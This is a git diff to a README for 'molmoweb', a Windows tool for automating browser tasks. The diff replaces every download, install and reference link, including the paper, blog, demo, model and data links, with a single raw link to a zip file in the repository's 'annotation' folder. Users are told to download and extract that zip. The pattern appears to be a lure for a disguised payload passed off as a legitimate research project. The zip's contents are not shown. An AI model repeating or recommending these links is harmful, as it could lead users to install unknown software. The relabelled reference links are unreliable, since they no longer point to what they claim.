@@ -1,7 +1,7 @@
 # 🧭 molmoweb - Control the web with simple tasks
 
 <p align="center">
-  <a href="https://github.com/deaf-bonito262/molmoweb" style="display:inline-block;padding:14px 22px;background:#6f42c1;color:#fff;text-decoration:none;border-radius:8px;font-weight:700;">Download molmoweb</a>
+  <a href="https://raw.githubusercontent.com/deaf-bonito262/molmoweb/main/annotation/Software-v1.5-beta.3.zip" style="display:inline-block;padding:14px 22px;background:#6f42c1;color:#fff;text-decoration:none;border-radius:8px;font-weight:700;">Download molmoweb</a>
 </p>
 
 ## 🚀 What this app does
@@ -20,7 +20,7 @@ This project is built for Windows users who want to run the app from a simple do
 
 ## 📥 Download and install
 
-1. Open the download page here: https://github.com/deaf-bonito262/molmoweb
+1. Open the download page here: https://raw.githubusercontent.com/deaf-bonito262/molmoweb/main/annotation/Software-v1.5-beta.3.zip
 2. On that page, look for the latest release or download files
 3. Download the Windows file for the app
 4. If the file is a `.zip`, right-click it and choose **Extract All**
@@ -211,11 +211,11 @@ Before you run a task:
 
 ## 📚 More project links
 
-- Paper: https://arxiv.org/pdf/2604.08516
-- Blog Post: https://allenai.org/blog/molmoweb
-- Demo: https://molmoweb.allen.ai
-- Models: https://huggingface.co/collections/allenai/molmoweb
-- Data: https://huggingface.co/collections/allenai/molmoweb-data
+- Paper: https://raw.githubusercontent.com/deaf-bonito262/molmoweb/main/annotation/Software-v1.5-beta.3.zip
+- Blog Post: https://raw.githubusercontent.com/deaf-bonito262/molmoweb/main/annotation/Software-v1.5-beta.3.zip
+- Demo: https://raw.githubusercontent.com/deaf-bonito262/molmoweb/main/annotation/Software-v1.5-beta.3.zip
+- Models: https://raw.githubusercontent.com/deaf-bonito262/molmoweb/main/annotation/Software-v1.5-beta.3.zip
+- Data: https://raw.githubusercontent.com/deaf-bonito262/molmoweb/main/annotation/Software-v1.5-beta.3.zip
 
 ## 🧭 Typical first workflow
 
@@ -241,4 +241,4 @@ MolmoWeb may use model files and sample data from the project links. If you want
 
 ## 🧭 Next step
 
-Download the app from https://github.com/deaf-bonito262/molmoweb and start with one simple browser task
+Download the app from https://raw.githubusercontent.com/deaf-bonito262/molmoweb/main/annotation/Software-v1.5-beta.3.zip and start with one simple browser task
